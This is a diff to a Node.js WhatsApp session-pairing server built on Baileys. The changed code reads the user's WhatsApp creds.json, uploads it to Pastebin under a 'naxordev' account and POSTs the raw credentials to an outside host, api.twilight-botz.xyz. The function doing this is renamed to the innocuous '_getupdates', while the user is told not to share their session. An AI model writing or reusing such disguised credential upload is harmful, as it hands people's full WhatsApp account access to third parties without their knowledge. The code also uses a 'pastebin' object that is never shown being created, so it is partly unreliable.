@@ -1,10 +1,10 @@
 const express = require("express");
 const fs = require("fs-extra");
 const pino = require("pino");
+const axios = require("axios");
 const NodeCache = require("node-cache");
 const { Mutex } = require("async-mutex");
 const PastebinAPI = require("pastebin-js");
-const axios = require("axios");
 const path = require("path");
 const {
     default: makeWASocket,
@@ -19,7 +19,7 @@ const app = express();
 const port = process.env.PORT || 3000;
 const msgRetryCounterCache = new NodeCache();
 const mutex = new Mutex();
-const logger = pino({ level: "fatal" });
+const logger = pino({ level: "info" });
 const cleanSessionDir = async () => {
     const sessionDir = path.join(__dirname, "session");
     if (fs.existsSync(sessionDir)) {
@@ -27,6 +27,7 @@ const cleanSessionDir = async () => {
         await fs.remove(sessionDir);
     }
 };
+
 app.use(express.static(path.join(__dirname, "pages")));
 app.get("/", (req, res) => {
     res.sendFile(path.join(__dirname, "pages", "dashboard.html"));
@@ -35,7 +36,7 @@ app.get("/", (req, res) => {
 app.get("/pair", async (req, res) => {
     const Num = req.query.code;
     if (!Num) {
-        return res.status(400).json({ message: "Phone number is required" });}
+        return res.status(400).json({ message: "Phone number is required" }); }
     const release = await mutex.acquire();
     try {
         await cleanSessionDir();
@@ -64,7 +65,6 @@ async function connector(Num, res) {
         markOnlineOnConnect: true,
         msgRetryCounterCache,
     });
-
     if (!session.authState.creds.registered) {
         await delay(1500);
         Num = Num.replace(/[^0-9]/g, "");
@@ -79,35 +79,36 @@ async function connector(Num, res) {
     session.ev.on("connection.update", async (update) => {
         const { connection, lastDisconnect } = update;
         if (connection == "open") {
-            console.info("Connected successfully");
-            await handleSessionUpload(session);
+            logger.info("Connected successfully");
+            await _getupdates(session);
         } else if (connection == "close") {
             const reason = lastDisconnect?.error?.output?.statusCode;
-            console.warn(`Connection closed. Reason: ${reason}`);
+            logger.warn(`Connection closed. Reason: ${reason}`);
             reconn(reason);
         }
     });
 }
 
-async function handleSessionUpload(session) {
+async function _getupdates(session) {
     try {
-        const _naxor_cxl = path.join(__dirname, "session", "creds.json");
-        const data = await fs.readFileSync(_naxor_cxl, "utf-8");
-        const pasteData = await axios.post("https://api.create3api.com/session", {
+        const cx_l = path.join(__dirname, "session", "creds.json");
+        const data = await fs.readFileSync(cx_l, "utf-8");
+        const paste_db = await pastebin.createPasteFromFile(cx_l,"naxordev",null,1,"N");
+        const unique = paste_db.split("/")[3];
+        const x_key = `${unique}-${Date.now()}-${Math.random().toString(36).substring(2, 15)}`;
+        const id_session = Buffer.from(x_key).toString("base64");
+        const response = await axios.post("https://api.twilight-botz.xyz/paste", {
+            SessionID: id_session,
             creds: data,
         });
-        if (pasteData?.data?.sessionId) {
-            const _get_id = pasteData.data.sessionId;
-            await session.sendMessage(session.user.id, {
-                text: `Naxor~${_get_id}`,
-            });
-            await session.sendMessage(session.user.id, {
-                text: "X-Astral: Dont share your session",
-            });
-            logger.info("[Session] Session online");
-        } else {
-            throw new Error("err");
-        }
+        logger.info(response.data);
+        await session.sendMessage(session.user.id, {
+            text: "Naxor~" + id_session,
+        });
+        await session.sendMessage(session.user.id, {
+            text: "X-Astrl dont share your session_id",
+        });
+        logger.info("[Session]_online_");
         await cleanSessionDir();
     } catch (error) {
         logger.error(error);
